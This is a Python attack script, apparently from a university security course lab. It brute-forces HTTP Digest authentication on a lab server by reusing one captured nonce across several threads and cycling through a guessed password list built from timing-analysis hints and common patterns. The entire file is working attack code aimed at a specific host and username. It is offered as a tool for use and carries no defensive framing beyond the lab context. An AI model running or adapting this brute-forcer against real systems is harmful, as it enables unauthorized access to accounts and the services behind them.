#!/usr/bin/env python3
"""
HTTP Digest Nonce-Reuse Burst Attack
Captures a nonce and reuses it rapidly for multiple authentication attempts
"""

import requests
import hashlib
import time
import re
import threading
import queue

class DigestBurstAttacker:
    def __init__(self):
        self.url = 'http://192.168.100.103/digestauth'
        self.username = 'wangxx'
        self.session = requests.Session()
        
        # High-probability 6-character alphanumeric passwords
        self.passwords = [
            # From timing analysis - known patterns truncated/modified to 6 chars
            'passw0', 'a1b2c3', 'trust', 'qwerty', '1q2w3e',
            'letme1', 'letme2', 'admin1', 'test12', 'qwert1',
            
            # Fast characters from timing: B, P, 3, v, e, z, Y, O, W, 5
            'B12345', 'P12345', '312345', 'v12345', 'e12345',
            'z12345', 'Y12345', 'O12345', 'W12345', '512345',
            
            # Common 6-char patterns
            '123456', '111111', 'qwerty', 'abc123', 'password'[:6],
            'admin1', 'test12', 'user12', 'pass12', 'login1',
            
            # Keyboard patterns
            'qazwsx', 'wsxedc', 'edcvfr', 'rfvtgb', 'tgbyhn',
            'asdfgh', 'zxcvbn', 'qwerty', 'yuiop1', 'poiuy1',
            
            # Course-related patterns (CS 660)
            'cs6601', 'cs660a', 'cs6600', 'jmu123', 'jmu660',
            'auth12', 'digest', 'basic1', 'http12', 'web123',
            
            # Number patterns
            '111111', '222222', '333333', '123123', '456456',
            '789789', '654321', '987654', '112233', '445566',
            
            # From PVD results - 6 char versions
            'qaZwsX', 'ABB1T1', 'D5912K', '111111'
        ]
        
        # Remove duplicates and ensure 6-char alphanumeric
        seen = set()
        filtered = []
        for p in self.passwords:
            if len(p) == 6 and p.replace('-', '').replace('_', '').isalnum() and p not in seen:
                seen.add(p)
                filtered.append(p)
        self.passwords = filtered
        
    def get_digest_challenge(self):
        """Get fresh digest challenge"""
        try:
            response = self.session.get(self.url, timeout=5)
            if response.status_code == 401:
                auth_header = response.headers.get('WWW-Authenticate', '')
                if 'Digest' in auth_header:
                    return self.parse_challenge(auth_header)
            return None
        except Exception as e:
            print(f"Error getting challenge: {e}")
            return None
    
    def parse_challenge(self, auth_header):
        """Parse digest challenge header"""
        challenge = {}
        
        # Extract realm
        realm_match = re.search(r'realm="([^"]*)"', auth_header)
        if realm_match:
            challenge['realm'] = realm_match.group(1)
        
        # Extract nonce  
        nonce_match = re.search(r'nonce="([^"]*)"', auth_header)
        if nonce_match:
            challenge['nonce'] = nonce_match.group(1)
        
        # Extract qop
        qop_match = re.search(r'qop="([^"]*)"', auth_header)
        if qop_match:
            challenge['qop'] = qop_match.group(1)
        
        # Extract algorithm
        alg_match = re.search(r'algorithm=([^,\s]*)', auth_header)
        challenge['algorithm'] = alg_match.group(1) if alg_match else 'MD5'
        
        return challenge if 'realm' in challenge and 'nonce' in challenge else None
    
    def create_digest_response(self, challenge, password, nc=1, cnonce="00000001"):
        """Create digest authentication response"""
        realm = challenge['realm']
        nonce = challenge['nonce']
        uri = '/digestauth'
        method = 'GET'
        qop = challenge.get('qop')
        
        # Create HA1
        ha1 = hashlib.md5(f"{self.username}:{realm}:{password}".encode()).hexdigest()
        
        # Create HA2
        ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
        
        # Create response
        if qop and 'auth' in qop:
            # With qop
            nc_str = f"{nc:08x}"
            response_data = f"{ha1}:{nonce}:{nc_str}:{cnonce}:{qop}:{ha2}"
            response_hash = hashlib.md5(response_data.encode()).hexdigest()
            
            auth_header = (f'Digest username="{self.username}", '
                          f'realm="{realm}", '
                          f'nonce="{nonce}", '
                          f'uri="{uri}", '
                          f'response="{response_hash}", '
                          f'qop={qop}, '
                          f'nc={nc_str}, '
                          f'cnonce="{cnonce}"')
        else:
            # Without qop (legacy)
            response_data = f"{ha1}:{nonce}:{ha2}"
            response_hash = hashlib.md5(response_data.encode()).hexdigest()
            
            auth_header = (f'Digest username="{self.username}", '
                          f'realm="{realm}", '
                          f'nonce="{nonce}", '
                          f'uri="{uri}", '
                          f'response="{response_hash}"')
        
        return auth_header
    
    def test_password_with_challenge(self, challenge, password):
        """Test a password with existing challenge"""
        try:
            auth_header = self.create_digest_response(challenge, password)
            
            response = self.session.get(
                self.url,
                headers={'Authorization': auth_header},
                timeout=5
            )
            
            return response.status_code, len(response.text) if response.text else 0
            
        except Exception as e:
            return None, str(e)
    
    def burst_attack_worker(self, challenge, password_queue, result_queue, worker_id):
        """Worker thread for burst attack"""
        while True:
            try:
                password = password_queue.get(timeout=1)
                status, content_len = self.test_password_with_challenge(challenge, password)
                
                result_queue.put((worker_id, password, status, content_len))
                
                if status == 200:
                    print(f"\n*** Worker {worker_id}: SUCCESS with password '{password}' ***")
                    # Signal other workers to stop
                    while not password_queue.empty():
                        try:
                            password_queue.get_nowait()
                        except:
                            break
                    break
                
                password_queue.task_done()
                time.sleep(0.1)  # Small delay to avoid overwhelming server
                
            except queue.Empty:
                break
            except Exception as e:
                result_queue.put((worker_id, password, f"ERROR: {e}", 0))
                password_queue.task_done()
    
    def run_burst_attack(self, num_workers=3):
        """Run burst attack with multiple workers reusing same nonce"""
        print("HTTP Digest Nonce-Reuse Burst Attack")
        print("=" * 50)
        
        # Get fresh challenge
        print("Getting fresh digest challenge...")
        challenge = self.get_digest_challenge()
        if not challenge:
            print("Failed to get digest challenge")
            return False
        
        print(f"Challenge obtained:")
        print(f"  Realm: {challenge['realm']}")
        print(f"  Nonce: {challenge['nonce'][:20]}...")
        print(f"  QOP: {challenge.get('qop', 'none')}")
        print(f"  Algorithm: {challenge.get('algorithm', 'MD5')}")
        print()
        
        # Setup queues
        password_queue = queue.Queue()
        result_queue = queue.Queue()
        
        # Add passwords to queue
        for password in self.passwords:
            password_queue.put(password)
        
        print(f"Testing {password_queue.qsize()} passwords with {num_workers} workers...")
        print("Starting burst attack with nonce reuse...")
        print()
        
        # Start worker threads
        workers = []
        start_time = time.time()
        
        for i in range(num_workers):
            worker = threading.Thread(
                target=self.burst_attack_worker,
                args=(challenge, password_queue, result_queue, i+1)
            )
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        # Monitor results
        success_found = False
        tested_passwords = 0
        
        while any(w.is_alive() for w in workers) or not result_queue.empty():
            try:
                worker_id, password, status, content_len = result_queue.get(timeout=1)
                tested_passwords += 1
                
                if status == 200:
                    print(f"*** SUCCESS! Password found: {password} ***")
                    print(f"Worker {worker_id} authenticated successfully")
                    print(f"Content length: {content_len}")
                    success_found = True
                    break
                elif isinstance(status, int):
                    if tested_passwords % 10 == 0:  # Progress every 10 attempts
                        elapsed = time.time() - start_time
                        rate = tested_passwords / elapsed if elapsed > 0 else 0
                        print(f"[{tested_passwords:3d}] Worker {worker_id}: {password} -> {status} ({rate:.1f} tests/sec)")
                else:
                    print(f"[ERR] Worker {worker_id}: {password} -> {status}")
                
            except queue.Empty:
                continue
        
        # Wait for workers to finish
        for worker in workers:
            worker.join(timeout=1)
        
        elapsed = time.time() - start_time
        print(f"\nBurst attack completed in {elapsed:.1f} seconds")
        print(f"Tested {tested_passwords} passwords at {tested_passwords/elapsed:.1f} tests/sec")
        
        if success_found:
            # Test access to protected content
            print("\nTesting access to protected content...")
            try:
                # Get new challenge for final test
                final_challenge = self.get_digest_challenge()
                if final_challenge and success_found:
                    # Find the successful password from results
                    success_password = None
                    # Would need to track this better in production code
                    print("Protected content test would require successful password tracking")
            except Exception as e:
                print(f"Error testing protected content: {e}")
        
        return success_found

if __name__ == "__main__":
    attacker = DigestBurstAttacker()
    success = attacker.run_burst_attack(num_workers=4)